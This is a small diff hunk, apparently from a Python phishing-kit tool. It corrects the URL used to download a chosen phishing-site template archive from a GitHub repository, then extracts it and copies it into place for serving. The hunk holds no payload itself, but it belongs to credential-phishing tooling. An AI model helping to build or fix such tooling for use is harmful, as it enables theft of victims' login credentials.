@@ -1296,7 +1296,7 @@ def main_menu():
         if not isdir(site):
             internet()
             delete("site.zip")
-            download(f"https://github.com/MMohanraj20/Files/tree/main/phishingsites/", "site.zip")
+            download(f"https://github.com/MMohanraj20/Files/tree/main/phishingsites/{folder}.zip", "site.zip")
             extract("site.zip", site)
             remove("site.zip")
         copy(site, site_dir)
